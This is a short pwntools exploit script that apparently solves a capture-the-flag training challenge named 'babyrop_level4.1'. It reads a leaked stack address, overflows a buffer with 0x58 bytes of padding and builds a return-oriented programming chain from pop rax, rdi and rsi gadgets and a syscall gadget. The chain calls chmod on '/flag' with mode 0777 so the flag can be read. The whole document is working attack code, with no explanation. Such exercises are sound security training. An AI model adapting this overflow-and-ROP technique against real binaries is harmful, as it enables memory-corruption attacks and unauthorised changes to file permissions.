from pwn import *


p = process("/challenge/babyrop_level4.1")
buf = b"A" * (0x58)
p.recvuntil(b"located at: ")
leak = int(p.recvuntil(b".")[:-1], 16)

context.arch = 'amd64'

elf = ELF('/challenge/babyrop_level4.1')

rop = ROP(elf)
pop_rax = rop.rax.address
pop_rdi = rop.rdi.address
pop_rsi = rop.rsi.address
syscall = rop.syscall.address


rop.raw(pop_rax)
rop.raw(90)
rop.raw(pop_rdi)
rop.raw(leak + len(buf) + 7*8)
rop.raw(pop_rsi)
rop.raw(511)
rop.raw(syscall)
payload = buf + rop.chain() + b"/flag\x00"

p.send(payload)
print(p.recvall().decode())
p.close()